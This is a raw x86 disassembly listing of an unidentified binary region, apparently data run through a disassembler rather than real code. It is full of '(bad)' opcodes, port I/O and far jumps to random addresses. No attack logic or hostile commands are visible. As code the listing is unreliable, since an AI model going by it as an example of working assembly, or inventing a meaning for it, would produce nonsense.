  41adb9:	dec    eax
  41adba:	imul   ebx,DWORD PTR [eax+edx*4+0x507968b5],0x1d
  41adc2:	sub    eax,DWORD PTR [ecx]
  41adc4:	add    BYTE PTR [esi-0x72fffffd],ch
  41adca:	(bad)  
  41adcb:	(bad)  
  41adcc:	pop    edi
  41adcd:	(bad)  
  41adce:	nop
  41adcf:	xor    eax,0xd324325d
  41add4:	rol    BYTE PTR [ecx+0x6f34d71e],cl
  41adda:	jmp    0xe7032f04
  41addf:	and    BYTE PTR [ecx-0x5c],ch
  41ade2:	repz imul esp,DWORD PTR [esi+edx*4+0x396ff499],0x792be140
  41adee:	dec    esp
  41adef:	jb     0x41ada7
  41adf1:	in     eax,dx
  41adf2:	dec    ebp
  41adf3:	lds    ebp,FWORD PTR [edi+0x27e2ca30]
  41adf9:	cdq    
  41adfa:	out    dx,eax
  41adfb:	pop    esi
  41adfc:	ret    
  41adfd:	add    al,0xcf
  41adff:	inc    edx
  41ae00:	xor    al,bl
  41ae02:	outs   dx,BYTE PTR ds:[esi]
  41ae03:	retf   
  41ae04:	jnp    0x41add0
  41ae06:	push   eax
  41ae07:	push   ds
  41ae08:	mov    DWORD PTR [esi],edi
  41ae0a:	(bad)  
  41ae0b:	xlat   BYTE PTR ds:[ebx]
  41ae0c:	popf   
  41ae0d:	mov    ebp,0xd1f1a4bd
  41ae12:	pusha  
  41ae13:	jmp    0x5dab:0x1b77b492
  41ae1a:	pusha  
  41ae1b:	and    ah,BYTE PTR [ebp-0x35]
  41ae1e:	mov    esp,0xc13d3654
  41ae23:	cmp    BYTE PTR es:[edi],ah
  41ae26:	xor    ebx,esp
  41ae28:	adc    esi,DWORD PTR [edi-0x2b]
  41ae2b:	ja     0x41ae30
  41ae2d:	sbb    eax,DWORD PTR [eax+0x6]
  41ae30:	repz xchg ebp,eax
  41ae32:	(bad)  
  41ae33:	scas   al,BYTE PTR es:[edi]
  41ae34:	dec    eax
  41ae35:	mov    es,edx
  41ae37:	leave  
  41ae38:	jmp    0x31181b03
  41ae3d:	inc    edx
  41ae3e:	dec    edi
  41ae3f:	dec    eax
  41ae40:	cwde   
  41ae41:	mov    BYTE PTR [edi-0x62c201e7],dl
  41ae47:	into   
  41ae48:	push   0x489a9c63
  41ae4d:	adc    BYTE PTR [ecx-0x6f],dl
  41ae50:	test   esi,0x8d16e553
  41ae56:	mov    WORD PTR [ebx-0x17],?
  41ae59:	or     al,0x3d
  41ae5b:	retf   0x3de2
  41ae5e:	and    al,0xca
  41ae60:	pop    ebp
  41ae61:	nop
  41ae62:	mov    cl,0xee
  41ae64:	rdpmc  
  41ae66:	adc    BYTE PTR [ecx-0xe],al
  41ae69:	pop    ds
  41ae6a:	lea    ecx,[eax]
  41ae6c:	js     0x41ae6f
  41ae6e:	pop    esp
  41ae6f:	dec    edx
  41ae70:	pop    ebx
  41ae71:	sahf   
  41ae72:	test   al,0xec
  41ae74:	sbb    eax,0xdb3e55
  41ae79:	pop    edi
  41ae7a:	lods   eax,DWORD PTR ds:[esi]
  41ae7b:	or     eax,0xbabdd367
  41ae80:	add    ah,BYTE PTR [edi+0x36]
  41ae83:	aad    0xb0
  41ae85:	jmp    0x52a32e91
  41ae8a:	fisttp DWORD PTR [eax-0x31]
  41ae8d:	pop    eax
  41ae8e:	xchg   BYTE PTR [eax],bh
  41ae90:	xchg   ebx,eax
  41ae91:	mov    esp,0xdb613139
  41ae96:	arpl   WORD PTR [ebp+0x1c],cx
  41ae99:	pop    edx
  41ae9a:	inc    edx
  41ae9b:	sub    eax,0x7bb3f099
  41aea0:	test   edx,ecx
  41aea2:	popa   
  41aea3:	dec    ebp
  41aea4:	mov    bl,0x43
  41aea6:	push   cs
  41aea7:	jmp    0x41ae91
  41aea9:	pop    eax
  41aeaa:	inc    edi
  41aeab:	stos   BYTE PTR es:[edi],al
  41aeac:	addr16 inc edi
  41aeae:	or     al,0x6e
  41aeb0:	fisubr DWORD PTR [edi]
  41aeb2:	mov    dl,BYTE PTR [edi+0x33e468c8]
  41aeb8:	call   0x95a4da3f
  41aebd:	dec    DWORD PTR [eax+edx*8]
  41aec0:	cmp    al,BYTE PTR ds:0xb3f2cf76
  41aec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aec7:	call   0x4d83:0x721259ac
  41aece:	xor    al,0x4e
  41aed0:	mov    eax,0x7989161e
  41aed5:	imul   ebp,DWORD PTR gs:[edx+0x31],0xffffff8a
  41aeda:	cs adc eax,0x7baf1313
  41aee0:	imul   edx,DWORD PTR [ebx],0x36
  41aee3:	(bad)  
  41aee4:	push   0xcb63f567
  41aee9:	cdq    
  41aeea:	push   eax
  41aeeb:	outs   dx,DWORD PTR ds:[esi]
  41aeec:	je     0x41aef9
  41aeee:	or     DWORD PTR [ecx-0x2237aedc],esi
  41aef4:	cmp    BYTE PTR [esi],dl
  41aef6:	mov    esi,0x10cb6466
  41aefb:	and    al,bh
  41aefd:	iret   
  41aefe:	mov    esp,0x6b7258d6
  41af03:	(bad)  
  41af04:	int    0xa0
  41af06:	int3   
  41af07:	cwde   
  41af08:	adc    edx,ecx
  41af0a:	pop    esp
  41af0b:	arpl   WORD PTR [eax+0x67f9e6a8],sp
  41af11:	(bad)  
  41af12:	jl     0x41af5f
  41af14:	jne    0x41aea2
  41af16:	or     bh,BYTE PTR [edi]
  41af18:	sbb    esi,eax
  41af1a:	adc    ah,BYTE PTR [eax]
  41af1c:	loop   0x41aef6
  41af1e:	jmp    0xf6b3b7d6
  41af23:	ins    BYTE PTR es:[edi],dx
  41af24:	das    
  41af25:	and    edi,DWORD PTR [ecx+ebp*4]
  41af28:	mov    BYTE PTR [esi-0x8],bh
  41af2b:	cmc    
  41af2c:	sub    eax,0xcb77d075
  41af31:	jmp    0x4d1d11de
  41af36:	mov    eax,ds:0x819e1c3f
  41af3b:	mov    ebp,0xe50ce6a0
  41af40:	inc    edi
  41af41:	in     eax,0xe
  41af43:	sti    
  41af44:	and    eax,0xe5785dc8
  41af49:	lds    edx,FWORD PTR [edi+0x20]
  41af4c:	ret    
  41af4d:	mov    WORD PTR [ebp-0xb6867c7],fs
  41af53:	lea    esp,[esi-0x79]
  41af56:	xor    DWORD PTR [ebp-0x3],ebp
  41af59:	jbe    0x41aef5
  41af5b:	mov    esi,DWORD PTR [esp+esi*1+0x3a]
  41af5f:	dec    ecx
  41af60:	xchg   ebx,eax
  41af61:	push   es
  41af62:	fisubr DWORD PTR [edx+0x57a5a4a8]
  41af68:	adc    al,0x12
  41af6a:	sbb    al,BYTE PTR [esi+0x37]
  41af6d:	inc    edx
  41af6e:	test   eax,0xb9803fbc
  41af73:	mov    ch,0xae
  41af75:	test   eax,0x63ce0f11
  41af7a:	push   ecx
  41af7b:	retf   0xa49b
  41af7e:	popf   
  41af7f:	pop    ecx
  41af80:	out    dx,al
  41af81:	jns    0x41af0f
  41af83:	ds and eax,0xeff2938f
  41af89:	push   edx
  41af8a:	jb     0x41af79
  41af8c:	mov    bh,0x9d
  41af8e:	adc    al,0x5e
  41af90:	rcl    DWORD PTR [eax-0x75],0x49
  41af94:	adc    eax,DWORD PTR [edi]
  41af96:	adc    BYTE PTR [ecx-0x79d4ecfd],0xe5
  41af9d:	stos   BYTE PTR es:[edi],al
  41af9e:	push   ds
  41af9f:	mov    dh,0x81
  41afa1:	and    BYTE PTR [edx+0x6c],al
  41afa4:	jae    0x41afc2
  41afa6:	jmp    0x69c1:0xd9a85dc8
  41afad:	ret    
  41afae:	idiv   esp
  41afb0:	adc    ebp,ecx
  41afb2:	hlt    
  41afb3:	sbb    DWORD PTR [edx+ebp*8],eax
  41afb6:	mov    cs,WORD PTR [eax-0xf]
  41afb9:	cmp    al,dl
  41afbb:	mov    dl,0x88
  41afbd:	pop    edx
  41afbe:	sbb    ebx,DWORD PTR [esi-0x2c4944b6]
  41afc4:	inc    eax
  41afc5:	out    dx,eax
  41afc6:	adc    ebp,DWORD PTR [esi-0x60]
  41afc9:	sub    BYTE PTR [ebx-0x27437cd9],ah
  41afcf:	popf   
  41afd0:	xchg   edx,eax
  41afd1:	loop   0x41b02b
  41afd3:	inc    DWORD PTR [edx+0x12]
  41afd6:	lods   eax,DWORD PTR ds:[esi]
  41afd7:	mov    bh,0x12
  41afd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afda:	mov    edx,0x22745690
  41afdf:	inc    ebp
  41afe0:	lahf   
  41afe1:	inc    edi
  41afe2:	ret    
  41afe3:	rcl    DWORD PTR [ebp+0x7c3a27e4],0x3b
  41afea:	and    BYTE PTR [ebx],dh
  41afec:	push   edi
  41afed:	ss out dx,eax
  41afef:	loopne 0x41b031
  41aff1:	lds    ecx,FWORD PTR [eax]
  41aff3:	test   DWORD PTR [esp+eax*1+0x6120d08d],ebp
  41affa:	mov    dh,0xd7
  41affc:	mov    bl,0x22
  41affe:	pop    ecx
  41afff:	sub    esi,esp
  41b001:	sbb    al,0x6f
  41b003:	int3   
  41b004:	jecxz  0x41afde
  41b006:	popf   
  41b007:	add    al,ah
  41b009:	loop   0x41b085
  41b00b:	cmp    BYTE PTR ds:0xcf84c052,0xd9
  41b012:	popf   
  41b013:	cmc    
  41b014:	cs lock pop ecx
  41b017:	das    
  41b018:	nop
  41b019:	cmp    BYTE PTR [edx-0x1b7b75be],cl
  41b01f:	out    dx,al
  41b020:	add    BYTE PTR [ebp-0x5f5f6e84],0x5b
  41b027:	or     DWORD PTR [edx+ebp*4-0x79be95fa],0x58e8d119
  41b032:	dec    esp
  41b033:	clc    
  41b034:	in     al,0x2a
  41b036:	cmp    eax,0x86fbf7f4
  41b03b:	daa    
  41b03c:	aas    
  41b03d:	popa   
  41b03e:	jmp    0x5cda:0xc14c89ce
  41b045:	cli    
  41b046:	adc    al,0x84
  41b048:	push   0x15c24f24
  41b04d:	leave  
  41b04e:	mov    bh,0x55
  41b050:	add    WORD PTR [eax],bp
  41b053:	or     DWORD PTR [ecx+0x1b],edx
  41b056:	cwde   
  41b057:	lock bound eax,QWORD PTR [ecx-0x1]
  41b05b:	stc    
  41b05c:	mov    DWORD PTR [esi-0x228c4505],edi
  41b062:	jmp    0x41b06a
  41b064:	push   0x37
  41b066:	xor    eax,0x1dc1fa96
  41b06b:	add    bh,ch
  41b06d:	push   ss
  41b06e:	pop    ds
  41b06f:	pop    ebx
  41b070:	fidivr DWORD PTR [ebp-0x41]
  41b073:	out    0xbe,eax
  41b075:	out    0x38,al
  41b077:	sub    al,0xbc
  41b079:	stos   BYTE PTR es:[edi],al
  41b07a:	sbb    DWORD PTR [esi+ebp*8-0x6f],edi
  41b07e:	mov    ds:0xb4944d6f,al
  41b083:	sub    BYTE PTR ds:0xa74d9e8,ah
  41b089:	pushf  
  41b08a:	enter  0xfd7c,0x8e
  41b08e:	inc    eax
  41b08f:	repz popa 
  41b091:	xchg   ecx,eax
  41b092:	pop    esp
  41b093:	mov    al,0xd6
  41b095:	in     al,0x60
  41b097:	fadd   QWORD PTR [eax+0x6e9faa0c]
  41b09d:	jb     0x41b0b0
  41b09f:	sbb    bh,BYTE PTR [eax-0x3]
  41b0a2:	add    BYTE PTR [esi+0x46],bl
  41b0a5:	push   ebp
  41b0a6:	mov    al,0x91
  41b0a8:	jno    0x41b06a
  41b0aa:	push   ebp
  41b0ab:	cmp    eax,DWORD PTR [ebx-0x1e]
  41b0ae:	jo     0x41b11a
  41b0b0:	sub    eax,0x2ddf77ba
  41b0b5:	pop    ebp
  41b0b6:	jno    0x41b130
  41b0b8:	outs   dx,BYTE PTR ds:[esi]
  41b0b9:	das    
  41b0ba:	xchg   edx,eax
  41b0bb:	sub    al,0xf5
  41b0bd:	xor    eax,0xdea5317
  41b0c2:	jle    0x41b0eb
  41b0c4:	cmp    ch,bh
  41b0c6:	sub    edi,0xffffffff
  41b0c9:	xchg   ebp,eax
  41b0ca:	add    al,0x4f
  41b0cc:	mov    edx,0xf174dfc2
  41b0d1:	xor    dl,BYTE PTR [edi+0x7]
  41b0d4:	add    eax,0x1f6c1201
  41b0d9:	cdq    
  41b0da:	les    edi,FWORD PTR [edx+0x725ca657]
  41b0e0:	outs   dx,BYTE PTR ds:[esi]
  41b0e1:	pop    ecx
  41b0e2:	or     BYTE PTR [eax],dh
  41b0e4:	pop    esi
  41b0e5:	leave  
  41b0e6:	leave  
  41b0e7:	ins    DWORD PTR es:[edi],dx
  41b0e8:	in     al,0x1c
  41b0ea:	lahf   
  41b0eb:	jmp    0x41b0af
  41b0ed:	jecxz  0x41b0c2
  41b0ef:	adc    cl,BYTE PTR [edx+0x29]
  41b0f2:	xchg   edx,eax
  41b0f3:	das    
  41b0f4:	xchg   ebp,eax
  41b0f5:	or     eax,0xcbf11fcc
  41b0fa:	ret    
  41b0fb:	mov    ds:0xa66f4ebc,al
  41b100:	add    ch,bl
  41b102:	add    DWORD PTR [eax-0x4cd17dad],edx
  41b108:	xor    eax,0x4610eb44
  41b10d:	xchg   edi,eax
  41b10e:	iret   
  41b10f:	cmp    ecx,DWORD PTR [ebx+0x1a]
  41b112:	out    0x53,eax
  41b114:	loop   0x41b0bc
  41b116:	ficom  DWORD PTR [ebp-0x6b8998f2]
  41b11c:	pushf  
  41b11d:	lock inc ecx
  41b11f:	or     ebp,DWORD PTR [ecx+0x46b3046a]
  41b125:	sti    
  41b126:	pop    edi
  41b127:	sar    ebx,1
  41b129:	push   eax
  41b12a:	aaa    
  41b12b:	popa   
  41b12c:	or     al,0x31
  41b12e:	imul   esi,esp,0x9d657284
  41b134:	and    DWORD PTR [esi+ebp*8+0x50],esp
  41b138:	aas    
  41b139:	cmc    
  41b13a:	xchg   ecx,eax
  41b13b:	xchg   esi,eax
  41b13c:	pop    edi
  41b13d:	dec    ecx
  41b13e:	pushf  
  41b13f:	les    esp,FWORD PTR [ebp+0x3bd51cad]
  41b145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b146:	add    al,0x4
  41b148:	repz out dx,al
  41b14a:	sbb    al,0x35
  41b14c:	addr16 ss pusha 
  41b14f:	jecxz  0x41b196
  41b151:	ficom  WORD PTR [eax+0x6a]
  41b154:	or     al,0x88
  41b156:	(bad)  
  41b157:	pusha  
  41b158:	aam    0xfc
  41b15a:	push   ebx
  41b15b:	jmp    0x9f5:0x70139c4b
  41b162:	mov    ds:0xa35c1b9c,al
  41b167:	retf   0x299a
  41b16a:	adc    edx,ecx
  41b16c:	mov    BYTE PTR [ecx],dh
  41b16e:	stc    
  41b16f:	push   edi
  41b170:	inc    esp
  41b171:	and    ah,bh
  41b173:	xchg   ecx,eax
  41b174:	and    edi,0xffffffeb
	...
  41b17f:	add    BYTE PTR [eax],al
  41b181:	jecxz  0x41b16b
  41b183:	nop
  41b184:	rcr    BYTE PTR [ebx+0x79fbe3f8],1
  41b18a:	dec    edx
  41b18b:	shr    ebp,0xf8
  41b18e:	jmp    0x1:0x2ecb2bdc
  41b195:	scas   al,BYTE PTR es:[edi]
  41b196:	add    eax,DWORD PTR [eax]
  41b198:	add    BYTE PTR [ecx],dh
  41b19a:	mov    esp,0xd04a70b6
  41b19f:	test   al,0xef
  41b1a1:	sbb    esp,esi
  41b1a3:	jne    0x41b1e8
  41b1a5:	mov    ch,0x4e
  41b1a7:	js     0x41b1ce
  41b1a9:	(bad)
  41b1ad:	test   bh,0x8d
  41b1b0:	push   esp
  41b1b1:	mov    BYTE PTR [edi+ebp*4+0x12a1fe53],cl
  41b1b8:	imul   eax,esi,0xffffffc0
  41b1bb:	inc    edx
  41b1bc:	dec    ebx
  41b1bd:	dec    ebx
  41b1be:	ds aaa 
  41b1c0:	sahf   
  41b1c1:	out    0x37,eax
  41b1c3:	jmp    0x326c:0x2427f3cd
  41b1ca:	mov    al,dl
  41b1cc:	test   BYTE PTR [edi],cl
  41b1ce:	jmp    0x41b224
  41b1d0:	and    ch,al
  41b1d2:	mov    cl,BYTE PTR [edi]
  41b1d4:	and    DWORD PTR [edx],ebx
  41b1d6:	xchg   ebx,eax
  41b1d7:	push   ebx
  41b1d8:	leave  
  41b1d9:	xchg   ebp,eax
  41b1da:	push   0xd025dcc4
  41b1df:	mov    edi,0xa7336f32
  41b1e4:	test   al,0xad
  41b1e6:	push   0x30
  41b1e8:	ret    0x4292
  41b1eb:	ins    DWORD PTR es:[edi],dx
  41b1ec:	inc    edx
  41b1ed:	dec    esp
  41b1ee:	lock cmp eax,0x231d9cf0
  41b1f4:	loop   0x41b208
  41b1f6:	or     al,0x39
  41b1f8:	pop    ebx
  41b1f9:	inc    eax
  41b1fa:	push   esp
  41b1fb:	rcr    bh,1
  41b1fd:	stos   DWORD PTR es:[edi],eax
  41b1fe:	add    eax,esp
  41b200:	stos   DWORD PTR es:[edi],eax
  41b201:	inc    ecx
  41b202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b203:	and    eax,0x92f90f20
  41b208:	mov    dl,0x99
  41b20a:	xchg   ebx,eax
  41b20b:	pop    esp
  41b20c:	cmp    al,dl
  41b20e:	jmp    0x4610:0x894b8f5a
  41b215:	or     eax,0xf16cf43c
  41b21a:	lea    ebx,[ebx-0x643e60c1]
  41b220:	jecxz  0x41b28e
  41b222:	in     al,dx
  41b223:	dec    ecx
  41b224:	sub    al,0x57
  41b226:	sub    DWORD PTR [ebp+edx*8+0x5b8cd8b1],esp
  41b22d:	xchg   edi,eax
  41b22e:	jbe    0x41b225
  41b230:	rcr    DWORD PTR [eax+0x47e12e2a],0x7a
  41b237:	popf   
  41b238:	test   BYTE PTR [esi+0x7c],0x69
  41b23c:	jnp    0x41b22d
  41b23e:	fcom   QWORD PTR [esi+0xe]
  41b241:	cmp    DWORD PTR [ecx-0x21],ecx
  41b244:	(bad)  
  41b245:	sbb    ch,BYTE PTR [esi-0x5f]
  41b248:	inc    edi
  41b249:	shl    BYTE PTR [edi-0x5904a833],1
  41b24f:	outs   dx,BYTE PTR ds:[esi]
  41b250:	push   cs
  41b251:	adc    ch,bl
  41b253:	pop    esp
  41b254:	into   
  41b255:	inc    edi
  41b256:	ret    0xd1a7
  41b259:	ss jp  0x41b249
  41b25c:	push   ebp
  41b25d:	mov    fs,ebx
  41b25f:	arpl   WORD PTR [ebx+0x723db5e0],dx
  41b265:	aaa    
  41b266:	inc    edi
  41b267:	dec    esp
  41b268:	mov    dh,0x9d
  41b26a:	mov    esi,0x615a9e69
  41b26f:	mov    dh,0x94
  41b271:	sbb    al,0x6a
  41b273:	xor    DWORD PTR [ecx],ebx
  41b275:	mov    eax,ds:0x94627775
  41b27a:	(bad)  
  41b27b:	sahf   
  41b27c:	out    dx,al
  41b27d:	mov    esi,0xbf400a88
  41b282:	sub    BYTE PTR [esp+ebx*1-0x4c],bl
  41b286:	fstp   QWORD PTR [esi-0x56]
  41b289:	sub    BYTE PTR [ebp-0x7ddc0202],ah
  41b28f:	mov    ebp,0xe1a3a0d7
  41b294:	jle    0x41b2e9
  41b296:	jmp    0xa323:0xe506ba67
  41b29d:	adc    al,0x7f
  41b29f:	test   al,0xc1
  41b2a1:	push   ebp
  41b2a2:	jg     0x41b277
  41b2a4:	aad    0x98
  41b2a6:	iret   
  41b2a7:	dec    eax
  41b2a8:	pop    ebp
  41b2a9:	and    eax,0x1e3d20ca
  41b2ae:	adc    esp,eax
  41b2b0:	call   0xc6f04ad4
  41b2b5:	or     al,0xcc
  41b2b7:	daa    
  41b2b8:	push   ebx
  41b2b9:	out    dx,eax
  41b2ba:	fwait
  41b2bb:	pop    DWORD PTR ds:0x12463a36
  41b2c1:	xor    al,0xf6
  41b2c3:	mov    ds:0x4fb16f1a,al
  41b2c8:	push   ss
  41b2c9:	aam    0x7a
  41b2cb:	call   0xcc308878
  41b2d0:	and    eax,0xae6d8f26
  41b2d5:	mov    ds:0x99e2d7e8,eax
  41b2da:	test   eax,0x192a9a28
  41b2df:	iret   
  41b2e0:	outs   dx,DWORD PTR ds:[esi]
  41b2e1:	loopne 0x41b2dc
  41b2e3:	popf   
  41b2e4:	fmulp  st(5),st
  41b2e6:	inc    ebp
  41b2e7:	cmp    al,0xa7
  41b2e9:	dec    eax
  41b2ea:	aas    
  41b2eb:	and    al,0x34
  41b2ed:	or     edi,DWORD PTR [ebp+0x50b4d69]
  41b2f3:	(bad)  
  41b2f4:	fiadd  DWORD PTR [ebx]
  41b2f6:	xor    ch,BYTE PTR [eax+0x71]
  41b2f9:	add    BYTE PTR [ebp+0x15d1b1df],dh
  41b2ff:	inc    esi
  41b300:	cs mov edx,edx
  41b303:	stc    
  41b304:	or     al,BYTE PTR [edi+0x76]
  41b307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b308:	dec    esp
  41b309:	and    esp,edx
  41b30b:	inc    esp
  41b30c:	push   0xffffffbe
  41b30e:	mov    al,ds:0x1323062
  41b313:	jp     0x41b306
  41b315:	mov    bh,0x2a
  41b317:	into   
  41b318:	xchg   esp,eax
  41b319:	sub    al,0xc7
  41b31b:	mov    ah,0x86
  41b31d:	mov    bh,0xba
  41b31f:	pop    es
  41b320:	push   0xffffffbd
  41b322:	loop   0x41b2e6
  41b324:	mov    ecx,0xb748d4b3
  41b329:	cli    
  41b32a:	inc    esi
  41b32b:	mov    esp,0xea912736
  41b330:	mov    edi,0xfd528d14
  41b335:	fcomp  st(3)
  41b337:	popf   
  41b338:	cdq    
  41b339:	jle    0x41b333
  41b33b:	sbb    DWORD PTR gs:[edi-0x322fb1b6],edi
  41b342:	jb     0x41b392
  41b344:	and    BYTE PTR [esi+0x48],dh
  41b347:	mov    dh,0x81
  41b349:	outs   dx,DWORD PTR ds:[esi]
  41b34a:	rol    edi,cl
  41b34c:	or     ecx,DWORD PTR [edi]
  41b34e:	shl    DWORD PTR [edi],cl
  41b350:	push   0x7180450c
  41b355:	mov    esi,0xe4064d40
  41b35a:	sahf   
  41b35b:	pop    eax
  41b35c:	dec    ebp
  41b35d:	aam    0xe9
  41b35f:	jb     0x41b319
  41b361:	mov    dl,0xb1
  41b363:	(bad)  
  41b364:	and    BYTE PTR [esi-0x65],bl
  41b367:	into   
  41b368:	cmp    DWORD PTR [edx+0x706c4e58],ecx
  41b36e:	sub    ecx,DWORD PTR [ebx+0x250c6a5c]
  41b374:	xor    bh,BYTE PTR [edx]
  41b376:	inc    esi
  41b377:	xchg   BYTE PTR [edx+eax*8+0x2c],bh
  41b37b:	nop
  41b37c:	out    0x10,al
  41b37e:	inc    eax
  41b37f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b380:	fdivr  QWORD PTR [edx+0x78]
  41b383:	sbb    esi,edx
  41b385:	adc    eax,0x8b67faf
  41b38a:	scas   al,BYTE PTR es:[edi]
  41b38b:	jmp    0x8283:0x7180971f
  41b392:	fwait
  41b393:	add    eax,0x6a229c7c
  41b398:	out    0xfc,eax
  41b39a:	inc    edi
  41b39b:	pop    edx
  41b39c:	shr    ch,1
  41b39e:	and    ecx,ebp
  41b3a0:	sbb    BYTE PTR es:[eax+esi*8-0x12364336],ch
  41b3a8:	out    dx,eax
  41b3a9:	jne    0x41b3e9
  41b3ab:	mov    ecx,0xbfb12e6e
  41b3b0:	xor    al,0xe7
  41b3b2:	cmc    
  41b3b3:	idiv   BYTE PTR [ebp+0x17f0223e]
  41b3b9:	push   edi
  41b3ba:	push   0x6c74dea1
  41b3bf:	ds dec ebx
  41b3c1:	ret    0x8d00
  41b3c4:	in     eax,dx
  41b3c5:	scas   al,BYTE PTR es:[edi]
  41b3c6:	jno    0x41b3b5
  41b3c8:	ds ror BYTE PTR es:[ebp-0x135c22ba],0xd9
  41b3d1:	ins    BYTE PTR es:[edi],dx
  41b3d2:	out    dx,eax
  41b3d3:	or     al,0x87
  41b3d5:	aam    0xd4
  41b3d7:	xchg   esp,eax
  41b3d8:	rcl    BYTE PTR [ecx],0xfc
  41b3db:	fadd   DWORD PTR [edi+0x5997efda]
  41b3e1:	(bad)  
  41b3e2:	retf   
  41b3e3:	in     eax,dx
  41b3e4:	push   edx
  41b3e5:	xchg   ebx,eax
  41b3e6:	xor    bl,bh
  41b3e8:	pop    edx
  41b3e9:	rol    BYTE PTR [edi-0x32],cl
  41b3ec:	ins    BYTE PTR es:[edi],dx
  41b3ed:	rcl    BYTE PTR [edx-0x79b2604c],0x63
  41b3f4:	push   0xb7801349
  41b3f9:	ds jb  0x41b471
  41b3fc:	mov    ch,0xbb
  41b3fe:	ficomp DWORD PTR [ecx+0x4b6f90fc]
  41b404:	fisttp WORD PTR [eax+0x6250727]
  41b40a:	inc    esi
  41b40b:	jns    0x41b433
  41b40d:	call   0xb2b317c5
  41b412:	gs pop esp
  41b414:	iret   
  41b415:	jg     0x41b47e
  41b417:	cmp    al,0x64
  41b419:	dec    edi
  41b41a:	ds push 0x9bca5b8f
  41b420:	jae    0x41b488
  41b422:	xchg   edx,eax
  41b423:	out    dx,eax
  41b424:	loope  0x41b3e7
  41b426:	repz inc ecx
  41b428:	dec    esp
  41b429:	pop    ds
  41b42a:	mov    esp,0xf20c800e
  41b42f:	mov    bl,0x9
  41b431:	or     dh,ah
  41b433:	or     eax,0xa9cc85ed
  41b438:	cld    
  41b439:	mov    dl,0x1
  41b43b:	add    edx,DWORD PTR [ecx+0x3]
  41b43e:	lods   eax,DWORD PTR es:[esi]
  41b440:	jno    0x41b48a
  41b442:	mov    BYTE PTR [ebp+0x52],al
  41b445:	icebp  
  41b446:	dec    esi
  41b447:	push   0x9
  41b449:	pop    edx
  41b44a:	repnz dec ebp
  41b44c:	adc    BYTE PTR [esi-0x6b],ch
  41b44f:	retf   
  41b450:	leave  
  41b451:	and    bh,dh
  41b453:	mov    bh,0x4c
  41b455:	or     dl,BYTE PTR [ecx-0x3a]
  41b458:	jnp    0x41b3e8
  41b45a:	cmp    al,0x19
  41b45c:	xor    ecx,DWORD PTR [edi+edx*4-0x57da08ea]
  41b463:	or     al,0x2b
  41b465:	ret    
  41b466:	push   es
  41b467:	add    eax,0xba0248a4
  41b46c:	jle    0x41b44b
  41b46e:	shl    edi,0x8d
  41b471:	dec    ebp
  41b472:	js     0x41b4d3
  41b474:	and    eax,0x9da779ae
  41b479:	ins    BYTE PTR es:[edi],dx
  41b47a:	xchg   esi,eax
  41b47b:	ins    DWORD PTR es:[edi],dx
  41b47c:	jecxz  0x41b3fe
  41b47e:	int3   
  41b47f:	inc    ecx
  41b480:	or     DWORD PTR [edi-0x30100c80],ecx
  41b486:	mov    al,ds:0x1884cced
  41b48b:	js     0x41b476
  41b48d:	aaa    
  41b48e:	gs mov ebp,0xa7f28e9c
  41b494:	loop   0x41b4f2
  41b496:	push   0xffffffee
  41b498:	iret   
  41b499:	jmp    0x41b49f
  41b49b:	test   eax,0xca04579f
  41b4a0:	mov    ds:0xeeb1e3c8,eax
  41b4a5:	xchg   DWORD PTR [esi-0x73],edi
  41b4a8:	mov    ebp,0x9ee850d0
  41b4ad:	jns    0x41b486
  41b4af:	call   DWORD PTR [ecx-0x1677543d]
  41b4b5:	pop    edx
  41b4b6:	add    ch,BYTE PTR [edi]
  41b4b8:	xchg   ebp,eax
  41b4b9:	dec    esi
  41b4ba:	mov    eax,ds:0x4cb2660f
  41b4bf:	cwde   
  41b4c0:	call   0xb3f8:0x5812fa0b
  41b4c7:	add    DWORD PTR [esp+eiz*4],0xffffff95
  41b4cb:	mov    ebp,0x5eadd995
  41b4d0:	loopne 0x41b4fe
  41b4d2:	loop   0x41b4de
  41b4d4:	popa   
  41b4d5:	in     al,dx
  41b4d6:	cmp    al,0x16
  41b4d8:	loop   0x41b504
  41b4da:	sub    ecx,edi
  41b4dc:	aas    
  41b4dd:	xor    dh,BYTE PTR [ecx+0xe]
  41b4e0:	(bad)  
  41b4e1:	jg     0x41b524
  41b4e3:	mov    ah,0xef
  41b4e5:	int    0x9c
  41b4e7:	aam    0x4a
  41b4e9:	call   0xd6e9:0x63f50340
  41b4f0:	inc    ecx
  41b4f1:	pop    edi
  41b4f2:	shl    DWORD PTR [ebx],cl
  41b4f4:	xor    esi,DWORD PTR [ebx+0x1a]
  41b4f7:	pop    esp
  41b4f8:	xchg   DWORD PTR [edi-0x3f],edx
  41b4fb:	inc    esi
  41b4fc:	not    BYTE PTR [esi+edx*1]
  41b4ff:	lea    esp,[esi-0x6a]
  41b502:	ja     0x41b581
  41b504:	imul   edi,eax,0x8c1e5069
  41b50a:	bound  ecx,QWORD PTR [edi+0xa0b60d0]
  41b510:	sub    DWORD PTR ds:0xa4dff00e,0xf98cb276
  41b51a:	test   al,0xb0
  41b51c:	fwait
  41b51d:	dec    edi
  41b51e:	cld    
  41b51f:	push   ds
  41b520:	sub    al,0xf4
  41b522:	inc    ebx
  41b523:	int    0x63
  41b525:	pusha  
  41b526:	inc    edx
  41b527:	mov    ah,0x40
  41b529:	mov    edx,0x6b1ee5f5
  41b52e:	retf   
  41b52f:	xor    DWORD PTR [esi],eax
  41b531:	cwde   
  41b532:	mov    al,0x65
  41b534:	inc    ebx
  41b535:	add    eax,0x3b883d39
  41b53a:	sbb    DWORD PTR [ebx],edx
  41b53c:	pop    ecx
  41b53d:	jne    0x41b4f8
  41b53f:	and    BYTE PTR [edi-0x4232b872],bh
  41b545:	mov    dh,0x74
	...
  41b54f:	add    BYTE PTR [eax],al
  41b551:	out    dx,al
  41b552:	data16 hlt 
  41b554:	lods   eax,DWORD PTR ds:[esi]
  41b555:	cld    
  41b556:	mov    edi,0xbcb067ff
  41b55b:	hlt    
  41b55c:	xor    eax,0xd3e1bf95
  41b561:	jns    0x41b595
  41b563:	add    DWORD PTR [eax],eax
  41b565:	scas   al,BYTE PTR es:[edi]
  41b566:	add    eax,DWORD PTR [eax]
  41b568:	add    BYTE PTR [ecx+0x77843613],dl
  41b56e:	mov    bh,0x38
